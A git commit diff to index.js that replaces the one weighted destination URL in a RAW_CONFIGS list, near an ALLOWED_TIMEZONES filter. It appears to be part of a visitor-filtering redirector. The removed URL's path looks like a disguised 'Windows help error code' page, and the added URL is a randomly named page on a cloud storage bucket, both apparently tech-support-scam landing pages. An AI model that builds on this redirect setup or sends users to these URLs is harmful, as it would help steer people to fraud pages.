04048f328b3820f6f7ea8034cef35b7e2365b347
paalakash <palaksh452@gmail.com>
2026-06-03 00:52:15 +0530

    Update RAW_CONFIGS with new URL

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://nanandikply1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1", weight: 1.0 }
+    { url: "https://sdafgeqd.s3.us-east-005.dream.io/h8o23d2e3298d9d.html?Anph=skynode", weight: 1.0 }
 
 ];
 
